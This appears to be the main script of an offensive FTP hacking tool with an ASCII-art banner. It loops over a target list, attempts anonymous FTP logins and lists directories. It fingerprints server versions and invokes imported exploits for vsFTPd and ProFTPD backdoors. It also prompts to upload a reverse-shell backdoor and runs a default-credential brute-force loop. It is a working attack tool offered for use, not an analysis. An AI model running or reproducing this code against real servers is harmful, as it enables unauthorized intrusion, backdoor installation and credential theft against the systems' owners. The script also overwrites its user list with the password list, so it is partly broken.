
import ftplib
from ftplib import FTP
from colorama import Fore
import os,sys,socket
from exploit import vsFTP_exploit,proFTP_133c,ReverseShell,vuln,vuln_backdoor,proFTP_132rc3
from Brute import is_correct
from HTTP import web_request

print(Fore.MAGENTA + """
████████▄     ▄████████    ▄████████    ▄█   ▄█▄       ▄█    █▄   ▄██████▄   ▄█  ████████▄  
███   ▀███   ███    ███   ███    ███   ███ ▄███▀      ███    ███ ███    ███ ███  ███   ▀███ 
███    ███   ███    ███   ███    ███   ███▐██▀        ███    ███ ███    ███ ███▌ ███    ███ 
███    ███   ███    ███  ▄███▄▄▄▄██▀  ▄█████▀         ███    ███ ███    ███ ███▌ ███    ███ 
███    ███ ▀███████████ ▀▀███▀▀▀▀▀   ▀▀█████▄         ███    ███ ███    ███ ███▌ ███    ███ 
███    ███   ███    ███ ▀███████████   ███▐██▄        ███    ███ ███    ███ ███  ███    ███ 
███   ▄███   ███    ███   ███    ███   ███ ▀███▄      ███    ███ ███    ███ ███  ███   ▄███ 
████████▀    ███    █▀    ███    ███   ███   ▀█▀       ▀██████▀   ▀██████▀  █▀   ████████▀  """ + Fore.CYAN + " Version 1.0\n" + Fore.RESET)

IP = open("Files/targets.txt").readlines()
users = open("Files/users.txt").read().split("\n")
passwords = users = open("Files/passwords.txt").read().split("\n")
Port = 21

print(Fore.YELLOW + '[!] ' + Fore.RESET +  'Hunting Targets...')

for i in IP:
    try:
        ftp = FTP()
        ftp.connect(host=i.strip('\n'),port=Port,timeout=10)
        result = ftp.login()
        #ftp.cwd('vulnerable')
        if '230' in result:
            print(Fore.YELLOW + "[!] " + Fore.RESET + "Connection Successful: " + Fore.YELLOW + i.strip('\n') + Fore.RESET)
            print(Fore.YELLOW + "[!] " + Fore.RESET + Fore.RED + "Anonymous Logon Successful" + Fore.RESET)
            print(Fore.CYAN + "[*] " + Fore.RESET + "Listing Directories:")
            print(Fore.YELLOW + "[!] " + Fore.RESET + str(ftp.retrlines("LIST")))
            print(Fore.YELLOW + "[!] " + Fore.RESET + "Identifying Webserver")
            web_request(i.strip("\n"))
            print(Fore.CYAN + "[*] " + Fore.RESET + "Getting FTP Version: ")
            print(Fore.YELLOW + '    [!] ' + Fore.RESET + 'Version: ' + Fore.YELLOW + ftp.getwelcome()[4:] + Fore.RESET)
            vuln(i,ftp,Port)
            upload = input(Fore.MAGENTA + "    [?]" + Fore.RESET + " Try Uploading a Backdoor Y/N ? ")
            if upload.upper() == "Y":
                ReverseShell(ftp)
    except socket.timeout:
        print(Fore.YELLOW + "[!] " + Fore.RESET + "Timeout IP: " + Fore.YELLOW + i.strip('\n') + Fore.RESET + " May Be Blocked by Server")
        pass
    except OSError:
        print(Fore.YELLOW + "[!] " + Fore.RESET + "Host: " + Fore.YELLOW + i.strip('\n') + Fore.RESET + " not found")
        
    except:
        os.system('clear')
        print(Fore.MAGENTA + """
████████▄     ▄████████    ▄████████    ▄█   ▄█▄       ▄█    █▄   ▄██████▄   ▄█  ████████▄  
███   ▀███   ███    ███   ███    ███   ███ ▄███▀      ███    ███ ███    ███ ███  ███   ▀███ 
███    ███   ███    ███   ███    ███   ███▐██▀        ███    ███ ███    ███ ███▌ ███    ███ 
███    ███   ███    ███  ▄███▄▄▄▄██▀  ▄█████▀         ███    ███ ███    ███ ███▌ ███    ███ 
███    ███ ▀███████████ ▀▀███▀▀▀▀▀   ▀▀█████▄         ███    ███ ███    ███ ███▌ ███    ███ 
███    ███   ███    ███ ▀███████████   ███▐██▄        ███    ███ ███    ███ ███  ███    ███ 
███   ▄███   ███    ███   ███    ███   ███ ▀███▄      ███    ███ ███    ███ ███  ███   ▄███ 
████████▀    ███    █▀    ███    ███   ███   ▀█▀       ▀██████▀   ▀██████▀  █▀   ████████▀    \n""" + Fore.RESET)
        print(Fore.YELLOW + "[!] " + Fore.RESET + "Anonymous login not allowed or no write permissions")
        print(Fore.YELLOW + '[!] ' + Fore.RESET + 'Target: ' + Fore.YELLOW + i.strip('\n') + Fore.RESET)
        print(Fore.YELLOW + "[!] " + Fore.RESET + "Identifying Webserver")
        web_request(i.strip("\n"))
        print(Fore.CYAN + "[*] " + Fore.RESET + "Getting FTP Version: ")
        vuln_backdoor(i,ftp,Port)
        round2 = input(Fore.MAGENTA + "    [?]" + Fore.RESET + " Stop Exploitation? Y/N ")
        if round2.upper() == "Y":
            os.system("clear")
            print(Fore.YELLOW + "[!] " + Fore.RESET + "Goodbye")
        else:
            brute = input(Fore.YELLOW + '    [!]' + Fore.RESET + ' Start Bruteforce Attack? Y/N? (Warning Very Noisy!) ')
            if brute.upper() == "Y":
                print(Fore.CYAN + "    [*] " + Fore.RESET + "Bruteforcing Default Credentials...")
                print(Fore.YELLOW + "[!] " + Fore.RESET + "Users to try:", Fore.YELLOW,len(users), Fore.RESET)
                print(Fore.YELLOW + "[!]" + Fore.RESET + " Passwords to try:",Fore.YELLOW,len(passwords), Fore.RESET)
                print(Fore.YELLOW + "[!] " + Fore.RESET + "Login Attempts:",Fore.YELLOW,len(users) * len(passwords), Fore.RESET)
                for user in users:
                    for password in passwords:
                        if is_correct(user,password,i.strip("\n"),Port):
                            break
                
